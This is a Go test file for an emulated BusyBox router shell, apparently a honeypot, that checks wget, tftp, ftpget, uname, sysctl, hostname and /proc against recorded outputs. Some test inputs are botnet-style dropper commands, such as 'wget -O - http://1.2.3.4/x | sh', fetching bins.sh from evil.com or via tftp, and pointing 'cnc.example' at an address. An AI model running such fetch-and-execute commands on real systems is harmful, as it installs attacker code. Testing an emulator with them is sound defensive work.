package vfs

import "testing"

// The usage texts of the download tools, uname, sysctl and hostname, as the real BusyBox prints them.
var (
	wgetHelp     = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]\n\t[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]\n\t[-S|--server-response] [-U|--user-agent AGENT] [-T SEC] URL...\n\nRetrieve files via HTTP or FTP\n\n\t--spider\tOnly check URL existence: $? is 0 if exists\n\t-c\t\tContinue retrieval of aborted transfer\n\t-q\t\tQuiet\n\t-P DIR\t\tSave to DIR (default .)\n\t-S    \t\tShow server response\n\t-T SEC\t\tNetwork read timeout is SEC seconds\n\t-O FILE\t\tSave to FILE ('-' for stdout)\n\t-U STR\t\tUse STR for User-Agent header\n\t-Y on/off\tUse proxy\n"
	tftpHelp     = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: tftp [OPTIONS] HOST [PORT]\n\nTransfer a file from/to tftp server\n\n\t-l FILE\tLocal FILE\n\t-r FILE\tRemote FILE\n\t-g\tGet file\n\t-p\tPut file\n\t-b SIZE\tTransfer blocks of SIZE octets\n"
	ftpgetHelp   = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: ftpget [OPTIONS] HOST [LOCAL_FILE] REMOTE_FILE\n\nDownload a file via FTP\n\n\t-c\tContinue previous transfer\n\t-v\tVerbose\n\t-u USER\tUsername\n\t-p PASS\tPassword\n\t-P NUM\tPort\n"
	unameHelp    = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: uname [-amnrspvio]\n\nPrint system information\n\n\t-a\tPrint all\n\t-m\tThe machine (hardware) type\n\t-n\tHostname\n\t-r\tKernel release\n\t-s\tKernel name (default)\n\t-p\tProcessor type\n\t-v\tKernel version\n\t-i\tThe hardware platform\n\t-o\tOS name\n"
	sysctlHelp   = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: sysctl -p [-enq] [FILE...] / [-enqaw] [KEY[=VALUE]]...\n\nShow/set kernel parameters\n\n\t-p\tSet values from FILEs (default /etc/sysctl.conf)\n\t-e\tDon't warn about unknown keys\n\t-n\tDon't show key names\n\t-q      Quiet\n\t-a\tShow all values\n\t-w\tSet values\n"
	hostnameHelp = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: hostname [OPTIONS] [HOSTNAME | -F FILE]\n\nGet or set hostname or DNS domain name\n\n\t-s\tShort\n\t-i\tAddresses for the hostname\n\t-d\tDNS domain name\n\t-f\tFully qualified domain name\n\t-F FILE\tUse FILE's content as hostname\n"
)

// wget, tftp, ftpget, uname, sysctl, hostname and /proc, compared with the real BusyBox 1.30.1
// (ash_oracle, Docker busybox:1.30.1-uclibc, --network none). Its container had another kernel and no
// network at all: kernel, arch and "Network is unreachable" were replaced by the router's (the
// internet blocked upstream: "Connection timed out", tftp "timeout"). Files stay from row to row.
func TestNetworkApplets(t *testing.T) {
	tests := []struct {
		line string
		want string
		code int
	}{
		{`wget`, wgetHelp, 1},
		{`wget -x http://1.2.3.4/a`, "wget: invalid option -- x\n" + wgetHelp, 1},
		{`wget --foo http://1.2.3.4/a`, "wget: unrecognized option `--foo'\n" + wgetHelp, 1},
		{`wget http://1.2.3.4/bins.sh`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget 1.2.3.4/x`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget 1.2.3.4:8080/x`, "Connecting to 1.2.3.4:8080 (1.2.3.4:8080)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget evil.com/bins.sh`, "wget: bad address 'evil.com'\n", 1},
		{`wget http://evil.com:81/x.sh`, "wget: bad address 'evil.com:81'\n", 1},
		{`wget ftp://1.2.3.4/x`, "Connecting to 1.2.3.4 (1.2.3.4:21)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget gopher://1.2.3.4/x`, "wget: not an http or ftp url: gopher://1.2.3.4/x\n", 1},
		{`wget -q http://1.2.3.4/x`, "wget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget -O - http://1.2.3.4/x | sh`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 0},
		{`wget http://[::1]/x`, "Connecting to [::1] ([::1]:80)\nwget: can't connect to remote host: Connection refused\n", 1},
		{`wget http://[::1]:81/x`, "Connecting to [::1]:81 ([::1]:81)\nwget: can't connect to remote host: Connection refused\n", 1},
		{`wget http://[::1/x`, "wget: bad address '[::1'\n", 1},
		{`wget http://1.2.3.4:abc/x`, "wget: bad port spec '1.2.3.4:abc'\n", 1},
		{`wget http://1.2.3.4:99999/x`, "wget: bad port spec '1.2.3.4:99999'\n", 1},
		{`wget http://user:pw@1.2.3.4/x`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget http://localhost/x`, "Connecting to localhost (127.0.0.1:80)\nwget: can't connect to remote host (127.0.0.1): Connection refused\n", 1},
		{`wget http://`, "wget: bad address ''\n", 1},
		{`wget ''`, "wget: bad address ''\n", 1},
		{`wget -T abc http://1.2.3.4/`, "wget: invalid number 'abc'\n", 1},
		{`wget -T 5 http://1.2.3.4/`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget http://1.2.3.4/a http://5.6.7.8/b`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget 123/x`, "wget: bad address '123'\n", 1},
		{`wget -O`, "wget: option requires an argument -- O\n" + wgetHelp, 1},
		{`wget --output-document`, "wget: option `--output-document' requires an argument\n" + wgetHelp, 1},
		{`wget --quiet=1 http://1.2.3.4/`, "wget: option `--quiet' doesn't allow an argument\n" + wgetHelp, 1},
		{`wget --out=/tmp/x http://1.2.3.4/`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget --s http://1.2.3.4/`, "wget: option `--s' is ambiguous\n" + wgetHelp, 1},
		{`wget --no http://1.2.3.4/`, "wget: option `--no' is ambiguous\n" + wgetHelp, 1},
		{`wget -nv http://1.2.3.4/`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget -qnv http://1.2.3.4/`, "wget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget -T -5 http://1.2.3.4/`, "wget: invalid number '-5'\n", 1},
		{`wget -T '' http://1.2.3.4/`, "wget: invalid number ''\n", 1},
		{`wget http://1.2.3.4:/x`, "wget: bad port spec '1.2.3.4:'\n", 1},
		{`wget http://1.2.3.4:0080/x`, "Connecting to 1.2.3.4:0080 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget http://[::1]x/`, "wget: bad address '[::1]x'\n", 1},
		{`wget http://::1/x`, "Connecting to ::1 ([::1]:80)\nwget: can't connect to remote host: Connection refused\n", 1},
		{`wget HTTP://1.2.3.4/x`, "wget: not an http or ftp url: HTTP://1.2.3.4/x\n", 1},
		{`wget http://1.2.3.4?x=1`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget http://a@b@1.2.3.4/x`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`wget -- -x`, "wget: bad address '-x'\n", 1},
		{`wget -`, "wget: bad address '-'\n", 1},
		{`wget http://127.0.0.1:81/`, "Connecting to 127.0.0.1:81 (127.0.0.1:81)\nwget: can't connect to remote host (127.0.0.1): Connection refused\n", 1},
		{`wget http://0.0.0.0:81/`, "Connecting to 0.0.0.0:81 (0.0.0.0:81)\nwget: can't connect to remote host (0.0.0.0): Connection refused\n", 1},
		{`wget -q gopher://x`, "wget: not an http or ftp url: gopher://x\n", 1},
		{`wget -q evil.com`, "wget: bad address 'evil.com'\n", 1},
		{`wget --output-document=x`, wgetHelp, 1},
		{`wget -O x`, wgetHelp, 1},
		{`wget -U Mozilla --header 'X: y' --post-data a=b -t 3 --no-check-certificate --spider -c -S -Y off -P /tmp http://1.2.3.4/z`, "Connecting to 1.2.3.4 (1.2.3.4:80)\nwget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`tftp`, tftpHelp, 1},
		{`tftp 1.2.3.4`, tftpHelp, 1},
		{`tftp -g 1.2.3.4`, tftpHelp, 1},
		{`tftp -g -r bins.sh 1.2.3.4`, "tftp: timeout\n", 1},
		{`tftp -g -r bins.sh evil.com`, "tftp: bad address 'evil.com'\n", 1},
		{`tftp -g -l x -r bins.sh 1.2.3.4 69`, "tftp: timeout\n", 1},
		{`tftp -p -g -r x 1.2.3.4`, tftpHelp, 1},
		{`tftp -x`, "tftp: invalid option -- x\n" + tftpHelp, 1},
		{`tftp -g -r x -b 3 1.2.3.4`, "tftp: bad blocksize '3'\n", 1},
		{`tftp -g -r x 1.2.3.4 abc`, "tftp: timeout\n", 1},
		{`tftp -g -r x 1.2.3.4:99`, "tftp: timeout\n", 1},
		{`tftp -g -r x -b abc 1.2.3.4`, "tftp: bad blocksize 'abc'\n", 1},
		{`tftp -g -r x -b 65565 1.2.3.4`, "tftp: bad blocksize '65565'\n", 1},
		{`tftp -p -l nofile 1.2.3.4`, "tftp: can't open 'nofile': No such file or directory\n", 1},
		{`tftp -g -r x -l - 1.2.3.4`, "tftp: timeout\n", 1},
		{`tftp -g -r x 1.2.3.4 69 extra`, "tftp: timeout\n", 1},
		{`tftp -r`, "tftp: option requires an argument -- r\n" + tftpHelp, 1},
		{`cd /tmp; echo hi > up; tftp -p -l up 1.2.3.4`, "tftp: timeout\n", 1},
		{`tftp -g -r x -l /nodir/x 1.2.3.4`, "tftp: can't open '/nodir/x': No such file or directory\n", 1},
		{`ftpget`, ftpgetHelp, 1},
		{`ftpget 1.2.3.4 x`, "ftpget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`ftpget -v -u anonymous -p anonymous -P 21 1.2.3.4 bins.sh bins.sh`, "Connecting to 1.2.3.4 (1.2.3.4:21)\nftpget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`ftpget evil.com x y`, "ftpget: bad address 'evil.com'\n", 1},
		{`ftpget 1.2.3.4`, ftpgetHelp, 1},
		{`ftpget a b c d`, ftpgetHelp, 1},
		{`ftpget -P abc -v 1.2.3.4 x`, "Connecting to 1.2.3.4 (1.2.3.4:21)\nftpget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`ftpget -v 1.2.3.4:2121 x`, "Connecting to 1.2.3.4:2121 (1.2.3.4:2121)\nftpget: can't connect to remote host (1.2.3.4): Connection timed out\n", 1},
		{`ftpget -x`, "ftpget: invalid option -- x\n" + ftpgetHelp, 1},
		{`ftpget -u`, "ftpget: option requires an argument -- u\n" + ftpgetHelp, 1},
		{`uname`, "Linux\n", 0},
		{`uname -a`, "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n", 0},
		{`uname -snrvmpio`, "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l unknown unknown GNU/Linux\n", 0},
		{`uname -p`, "unknown\n", 0},
		{`uname -i`, "unknown\n", 0},
		{`uname -ms`, "Linux armv7l\n", 0},
		{`uname -m -s`, "Linux armv7l\n", 0},
		{`uname --machine`, "armv7l\n", 0},
		{`uname -x`, "uname: invalid option -- x\n" + unameHelp, 1},
		{`uname extra`, unameHelp, 1},
		{`uname -an`, "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n", 0},
		{`uname -a extra`, unameHelp, 1},
		{`uname --all`, "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n", 0},
		{`uname --mach`, "armv7l\n", 0},
		{`uname --k`, "uname: option `--k' is ambiguous\n" + unameHelp, 1},
		{`uname -`, unameHelp, 1},
		{`uname -r -v -o -n`, "gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 GNU/Linux\n", 0},
		{`sysctl`, "", 0},
		{`sysctl kernel.hostname`, "kernel.hostname = gateway\n", 0},
		{`sysctl kernel/hostname`, "kernel.hostname = gateway\n", 0},
		{`sysctl -n kernel.ostype`, "Linux\n", 0},
		{`sysctl -w kernel.hostname`, "sysctl: error: 'kernel.hostname' must be of the form name=value\n", 1},
		{`sysctl -w =x`, "sysctl: error: malformed setting '=x'\n", 1},
		{`sysctl -e vm.nope`, "", 1},
		{`sysctl -x`, "sysctl: invalid option -- x\n" + sysctlHelp, 1},
		{`sysctl vm.drop_caches`, "", 0},
		{`sysctl -n`, "", 0},
		{`sysctl -q kernel.ostype`, "kernel.ostype = Linux\n", 0},
		{`sysctl -p`, "sysctl: /etc/sysctl.conf: No such file or directory\n", 0},
		{`sysctl -p /nope`, "sysctl: /nope: No such file or directory\n", 0},
		{`sysctl kernel.nope`, "sysctl: error: 'kernel.nope' is an unknown key\n", 1},
		{`sysctl -n kernel.nope kernel.ostype`, "sysctl: error: 'kernel.nope' is an unknown key\nLinux\n", 1},
		{`sysctl kernel..ostype`, "kernel..ostype = Linux\n", 0},
		{`sysctl .kernel.ostype`, "sysctl: error: '.kernel.ostype' is an unknown key\n", 1},
		{`sysctl -w vm.swappiness=`, "sysctl: error: malformed setting 'vm.swappiness='\n", 1},
		{`sysctl -w vm.nope=1`, "sysctl: error: 'vm.nope' is an unknown key\n", 1},
		{`echo x > /proc/version`, "sh: write error: Input/output error\n", 1},
		{`echo x > /proc/nonexist`, "-sh: can't create /proc/nonexist: nonexistent directory\n", 1},
		{`touch /proc/x`, "touch: /proc/x: No such file or directory\n", 1},
		{`mkdir /proc/x`, "mkdir: can't create directory '/proc/x': No such file or directory\n", 1},
		{`cat /proc/sys/vm/drop_caches`, "cat: can't open '/proc/sys/vm/drop_caches': Permission denied\n", 1},
		{`cat < /proc/sys/vm/drop_caches`, "-sh: can't open /proc/sys/vm/drop_caches: Permission denied\n", 1},
		{`grep x /proc/sys/vm/drop_caches`, "grep: /proc/sys/vm/drop_caches: Permission denied\n", 2},
		{`wc -l /proc/sys/vm/drop_caches`, "wc: /proc/sys/vm/drop_caches: Permission denied\n", 1},
		{`cat /proc/sys/kernel/hostname /proc/sys/kernel/ostype`, "gateway\nLinux\n", 0},
		{`hostname`, "gateway\n", 0},
		{`hostname -x`, "hostname: invalid option -- x\n" + hostnameHelp, 1},
		{`hostname -s`, "gateway\n", 0},
		{`hostname -v`, "gateway\n", 0},
		{`hostname --fqdn`, "hostname: unrecognized option `--fqdn'\n" + hostnameHelp, 1},
	}
	prev := NewShell()
	for _, tt := range tests {
		sh := NewShell()
		sh.files, sh.dirs = prev.files, prev.dirs
		if got, code, _ := sh.Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
		prev = sh
	}
}

// What the oracle's container can't show (no network, a read-only /proc/sys): the router's own story,
// from the sources (BusyBox's wget.c, tftp.c, sysctl.c, hostname.c; the kernel's proc_sysctl.c, sysctl.c).
func TestRouterNetworkAndKernel(t *testing.T) {
	tests := []struct {
		line string
		want string
		code int
	}{
		// the internet is blocked upstream, the router's own addresses refuse, the LAN is empty, no IPv6
		{`wget http://203.0.113.5/x; echo $?`, "Connecting to 203.0.113.5 (203.0.113.5:80)\n" +
			"wget: can't connect to remote host (203.0.113.5): Connection timed out\n1\n", 0},
		{`wget https://203.0.113.5/x`, "wget: not an http or ftp url: https://203.0.113.5/x\n", 1}, // no WGET_HTTPS
		{`wget http://192.168.1.1/`, "Connecting to 192.168.1.1 (192.168.1.1:80)\n" +
			"wget: can't connect to remote host (192.168.1.1): Connection refused\n", 1},
		{`wget http://gateway:8080/x`, "Connecting to gateway:8080 (192.168.1.1:8080)\n" + // /etc/hosts
			"wget: can't connect to remote host (192.168.1.1): Connection refused\n", 1},
		{`wget 192.168.1.7/x`, "Connecting to 192.168.1.7 (192.168.1.7:80)\n" +
			"wget: can't connect to remote host (192.168.1.7): No route to host\n", 1},
		{`wget http://[2001:db8::1]/x`, "Connecting to [2001:db8::1] ([2001:db8::1]:80)\n" +
			"wget: can't connect to remote host: Network is unreachable\n", 1},
		{`echo '203.0.113.9 cnc.example' >> /etc/hosts; wget -O /tmp/b cnc.example/b; ls /tmp`,
			"Connecting to cnc.example (203.0.113.9:80)\n" +
				"wget: can't connect to remote host (203.0.113.9): Connection timed out\n", 0}, // -O FILE: not created
		{`tftp -g -r x 2001:db8::1`, "tftp: sendto: Network is unreachable\n", 1},
		{`tftp -g -r x ::1`, "tftp: timeout\n", 1},
		{`cd /tmp; echo hi > bins.sh; tftp -g -r bins.sh 203.0.113.5; ls; tftp -g -r y -l - 203.0.113.5; ls`,
			"tftp: timeout\ntftp: timeout\n", 0}, // the local file is emptied, then deleted when the transfer fails
		{`tftp -g -r x -l /proc/x 203.0.113.5`, "tftp: can't open '/proc/x': No such file or directory\n", 1},
		{`ftpget -v 203.0.113.5 bins.sh`, "Connecting to 203.0.113.5 (203.0.113.5:21)\n" +
			"ftpget: can't connect to remote host (203.0.113.5): Connection timed out\n", 1},

		// /proc/sys: what each setting takes (proc_dointvec_minmax, proc_dostring); /proc and /sys create nothing
		{`cat /proc/sys/vm/swappiness; echo 10 > /proc/sys/vm/swappiness; cat /proc/sys/vm/swappiness`, "60\n10\n", 0},
		{`echo abc > /proc/sys/vm/swappiness; echo $?; echo 101 > /proc/sys/vm/swappiness; cat /proc/sys/vm/swappiness`,
			"sh: write error: Invalid argument\n1\nsh: write error: Invalid argument\n60\n", 0},
		{`echo 0x10 > /proc/sys/vm/swappiness; cat /proc/sys/vm/swappiness; echo 010 > /proc/sys/vm/swappiness; ` +
			`cat /proc/sys/vm/swappiness; echo '  7 x' > /proc/sys/vm/swappiness; cat /proc/sys/vm/swappiness; ` +
			`echo 7x > /proc/sys/vm/swappiness`, "16\n8\n7\nsh: write error: Invalid argument\n", 1},
		{`echo 1 > /proc/sys/kernel/osrelease`, "-sh: can't create /proc/sys/kernel/osrelease: Permission denied\n", 1},
		{`echo 3 > /proc/sys/vm/drop_caches; echo $?; echo 5 > /proc/sys/vm/drop_caches`,
			"0\nsh: write error: Invalid argument\n", 1},
		{`echo x > /proc/version; cat /proc/version`, "sh: write error: Input/output error\n" + linuxVersion + "\n", 0},
		{`touch /proc/x; mkdir /proc/x; mkdir /sys/x; echo > /sys/x; touch /sys/x`,
			"touch: /proc/x: No such file or directory\n" +
				"mkdir: can't create directory '/proc/x': No such file or directory\n" +
				"mkdir: can't create directory '/sys/x': Operation not permitted\n" +
				"-sh: can't create /sys/x: Permission denied\ntouch: /sys/x: Permission denied\n", 1},
		{`ls /proc/sys`, "debug   dev     fs      kernel  net     user    vm\n", 0},
		{`ls -l /proc/sys/vm | cut -c1-10; ls -l /proc/sys/kernel/osrelease | cut -c1-10; ls -ld /proc/sys | cut -c1-10`,
			"--w-------\n-rw-r--r--\n-rw-r--r--\n-r--r--r--\ndr-xr-xr-x\n", 0},
		{`echo 'a b' > /proc/sys/kernel/domainname; cat /proc/sys/kernel/domainname`, "a b\n", 0},
		{`cp /etc/hostname /proc/sys/kernel/hostname; hostname; cp /etc/passwd /proc/version`,
			"gateway\ncp: write error: Input/output error\n", 1},

		// sysctl
		{`sysctl -w vm.swappiness=10; sysctl vm.swappiness; cat /proc/sys/vm/swappiness`,
			"vm.swappiness = 10\nvm.swappiness = 10\n10\n", 0},
		{`sysctl -w vm.nr_hugepages=128; echo $?; sysctl -e -w vm.nr_hugepages=128; echo $?`,
			"sysctl: error: 'vm.nr_hugepages' is an unknown key\n1\n1\n", 0}, // no hugetlbfs on this kernel
		{`sysctl -w kernel.osrelease=x; echo $?`, "0\n", 0}, // EACCES: skipped without a word
		{`sysctl -w vm.swappiness=abc kernel.hostname=x; echo $?; hostname`,
			"sysctl: write error: Invalid argument\n1\ngateway\n", 0}, // it dies: the keys after it stay
		{`sysctl -q -w vm.swappiness=1; sysctl -n -w vm.swappiness=2; sysctl -n vm.swappiness`, "2\n2\n", 0},
		{`sysctl vm`, "vm.overcommit_memory = 0\nvm.swappiness = 60\n", 0}, // drop_caches can't be read
		{`sysctl -a`, "kernel.domainname = (none)\nkernel.hostname = gateway\nkernel.osrelease = 4.14.180\n" +
			"kernel.ostype = Linux\nkernel.pid_max = 32768\nkernel.randomize_va_space = 2\n" +
			"kernel.version = #1 SMP Thu Jun  4 12:00:00 UTC 2020\nnet.ipv4.ip_forward = 1\n" +
			"vm.overcommit_memory = 0\nvm.swappiness = 60\n", 0},
		{`sysctl net.ipv4.ip_forward; sysctl net/ipv4/ip_forward`, "net.ipv4.ip_forward = 1\nnet.ipv4.ip_forward = 1\n", 0},
		{`printf 'vm.swappiness = 20\n# x\nbad\n ; y\nkernel.hostname=r1\n' > /etc/sysctl.conf; ` +
			`sysctl -p 2>&1 >/dev/null; sysctl -p 2>/dev/null; hostname`,
			"sysctl: bad line 3: 1 tokens found, 2 needed\nvm.swappiness = 20\nkernel.hostname = r1\nr1\n", 0},

		// hostname: uname -n and /proc follow it; the prompt and $HOSTNAME keep the name ash started with
		{`hostname newname; hostname; uname -n; cat /proc/sys/kernel/hostname; echo $HOSTNAME; uname -a`,
			"newname\nnewname\nnewname\ngateway\nLinux newname 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n", 0},
		{`hostname -i; hostname -f; hostname -d; hostname -s; hostname x.lan; hostname -s; hostname -i; echo $?`,
			"192.168.1.1\ngateway\ngateway\nx\nhostname: x.lan: Unknown host\n1\n", 0},
		{`hostname $(printf '%065d' 0); echo $?`, "hostname: sethostname: Invalid argument\n1\n", 0},
		{`echo myhost > /tmp/h; hostname -F /tmp/h; hostname; hostname -F /nope`,
			"myhost\nhostname: can't open '/nope': No such file or directory\n", 1},
	}
	for _, tt := range tests {
		if got, code, _ := NewShell().Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
	sh := NewShell()
	sh.Run("hostname evil")
	if p := sh.Prompt(); p != "root@gateway:~# " {
		t.Errorf("prompt after hostname: %q (ash reads the name once)", p)
	}
}
